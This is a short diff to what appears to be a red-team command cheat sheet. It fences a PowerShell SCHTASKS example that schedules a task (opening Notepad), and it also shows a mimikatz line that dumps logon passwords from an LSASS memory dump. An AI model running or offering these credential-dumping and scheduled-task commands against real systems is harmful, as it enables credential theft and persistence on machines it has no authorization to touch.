@@ -8,9 +8,14 @@
 
 ##### payload record:
 ##### SCHTASKS (powershell only)
+```
 $time = [DateTime]::Now.AddMinutes(30)
+
 $hourMinute = $time.ToString("HH:mm")
+
 SCHTASKS /Create /SC ONCE /TN "Open Notepad" /TR "notepad.exe" /ST $hourMinute
+```
+
 
 
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
